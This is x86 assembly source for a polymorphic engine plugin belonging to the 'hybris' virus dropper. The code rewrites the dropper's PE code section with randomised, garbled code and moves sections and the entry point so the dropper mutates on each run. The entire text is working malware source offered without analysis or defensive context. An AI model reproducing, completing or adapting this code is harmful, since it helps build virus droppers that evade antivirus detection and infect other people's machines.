;poly engine for hybris virus dropper
;improved engine with memory read/writes and complete garbling
;(c) vecna

.386p
.model flat
locals
.data

MZ_VERSION equ 0200h
MZ_TYPE    equ "ylop"           ;poly

extrn CloseHandle:PROC
extrn ExitProcess:PROC
extrn CreateFileA:PROC
extrn WriteFile:PROC

main:
       push 0
       push 80h
       push 2
       push 0
       push 0
       push 0c0000000h
       push offset muazzin_name
       call CreateFileA
       push eax
       push 0
       mov ecx, esp
       push 0
       push ecx
       push (offset muazzin_end-offset muazzin_start)
       push offset muazzin_start
       push eax
       call WriteFile
       pop eax
       call CloseHandle
       push 0
       call ExitProcess

muazzin_name db "POLY.",0

.code

muazzin_start equ this byte

muazzin_entry:
       mov esi, [esp+4]                 ;esi==muazzin_struc
       test dwo [esi+m_why], MT_PROCESSDROPPER
       jnz modify_dropper
       test dwo [esi+m_why], MT_QUERY
       jz @@exit
       mov esi, MT_QUERY+MT_PROCESSDROPPER
       mov ebx, MZ_TYPE
       mov ecx, MZ_VERSION
       mov eax, MR_DONE
  @@exit:
       ret 4

modify_dropper:
       pushad
       call @@kernel32
       db "KERNEL32.DLL",0
  @@kernel32:
       call [esi+GMH]
       call @@gettick
       db "GetTickCount",0
  @@gettick:
       push eax
       call [esi+GPA]
       call eax
       ;eax=random seed
       call delta
       mov dwo [ebp+(pseed)], eax
       lea edi, dwo [ebp+polyengine_end]
       push ebp
       push eax
       mov ebp, [esi+m_dropper]
       push ebp
       mov esi, ebp
       add esi, [esi+03ch]
       mov ecx, [esi.SH_SizeOfRawData+0f8h]
       mov esi, [esi.SH_PointerToRawData+0f8h]
       add esi, ebp
       call poly
       mov ebx, ecx
       pop ebp
       pop eax
       pop ecx
       mov dwo [ecx+pseed], eax
       ;ebx==new size
       mov esi, ebp
       add esi, [esi+03ch]
       mov edx, [esi.NT_OptionalHeader.OH_AddressOfEntryPoint]
       sub edx, [esi.SH_VirtualAddress+0f8h]
       jc @@done
       cmp edx, [esi.SH_SizeOfRawData+0f8h]
       jae @@done                ;entrypoint not in first
       ;edx=delta entry
       mov eax, [esi.SH_PointerToRawData+IMAGE_SIZEOF_SECTION_HEADER+0f8h]
       sub eax, [esi.SH_PointerToRawData+0f8h]
       sub eax, ebx
       jnc @@add                         ;enought space?
  @@increase:
       mov eax, [esi.SH_VirtualAddress+0f8h+IMAGE_SIZEOF_SECTION_HEADER]
       sub eax, [esi.SH_VirtualAddress+0f8h]
       sub eax, ebx
       jb @@done
       mov ecx, [esi.NT_OptionalHeader.OH_FileAlignment]
       dec ecx
       lea eax, [ebx+ecx]
       not ecx
       and eax, ecx
       cmp [esi.SH_VirtualSize+0f8h], eax
       jae @@skipz
       mov [esi.SH_VirtualSize+0f8h], eax
  @@skipz:
       mov ecx, [esi.SH_PointerToRawData+0f8h]
       add ecx, eax
       mov edi, eax
       sub edi, ebx
       mov eax, ecx
       xchg [esi.SH_PointerToRawData+0f8h+IMAGE_SIZEOF_SECTION_HEADER], eax
       sub ecx, eax
       pushad
       movzx ebx, wo [esi.FH_NumberOfSections+4]
       add esi, IMAGE_SIZEOF_SECTION_HEADER+0f8h
       dec ebx
  @@next_Sect:
       dec ebx
       jz @@nomoretroubles
       add esi, IMAGE_SIZEOF_SECTION_HEADER
       add [esi.SH_PointerToRawData], ecx
       jmp @@next_Sect
  @@nomoretroubles:
       popad
       ;ecx=size increased
       ;eax=new start
       pushad
       mov ebx, [esp+8*4+4]
       mov edx, [ebx+m_droppersize]
       add [ebx+m_droppersize], ecx
       sub edx, eax
       ;edx=how much code rest after newcode
       lea esi, [ebp+eax]
       add esi, edx
       push edi
       lea edi, [esi+ecx]
       std
       mov ecx, edx
       rep movsb
       pop eax
       xchg ecx, eax
       rep stosb
       cld
       popad
  @@add:
       xchg [esi.SH_SizeOfRawData+0f8h], ebx
       mov ecx, ebx
       mov eax, edx
       mov edx, [esi.NT_OptionalHeader.OH_ImageBase]
       add edx, [esi.SH_VirtualAddress+0f8h]
       mov edi, [esi.SH_PointerToRawData+0f8h]
       add edi, ebp
       mov esi, edi
       ;esi/edi=start of code
       push ebp
       call poly
       pop esi
       add esi, [esi+03ch]
       add eax, [esi.SH_VirtualAddress+0f8h]
       mov [esi.NT_OptionalHeader.OH_AddressOfEntryPoint], eax
  @@done:
       popad
       mov dwo [esi+m_result], MR_OK
       ret 4

include engine.inc
include ..\..\muazzin.asi
include \inc\pe.inc


tmpbuffer equ $

muazzin_end equ this byte

end    main
